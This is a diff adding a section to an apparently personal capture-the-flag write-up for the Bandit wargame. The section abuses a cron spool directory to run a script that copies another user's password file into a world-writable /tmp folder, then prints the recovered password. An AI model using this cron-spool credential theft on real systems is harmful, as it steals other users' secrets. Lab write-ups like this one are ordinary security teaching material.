@@ -74,5 +74,37 @@ done
 ```
 
 checking /var/spool/bandit23 , only /var/spool/bandit24 and it says permission denied
+okay so it says we will be writing our first bash script 
 
+so lets make folder in /tmp/ i called it menz
 
+and write a script to get bandit24 password stored in /etc/bandit_pass/bandit24
+
+```shell
+bandit23@bandit:/tmp/menz$ cat menz.sh                                                                                   
+#!/bin/bash                                                                                                              
+                                                                                                                         
+cat /etc/bandit_pass/bandit24 > /tmp/menz/pass.txt   
+```
+so it cat the file and save it in our directory with name pass.txt
+
+now we need 2 more things , permission for the script to execute 
+```shell
+chmod 777 menz.sh
+```
+and permission for the folder to write in
+
+```shell 
+chmod 777 /tmp/menz/
+```
+now copy the bash script to /var/spool/bandit24/
+
+wait for some time because its a scheduled task
+
+and finally we have our pass.txt
+```shell
+bandit23@bandit:/tmp/menz$ ls                                                                                            
+menz.sh  pass.txt
+bandit23@bandit:/tmp/menz$ cat pass.txt                                                                                  
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ       
+```
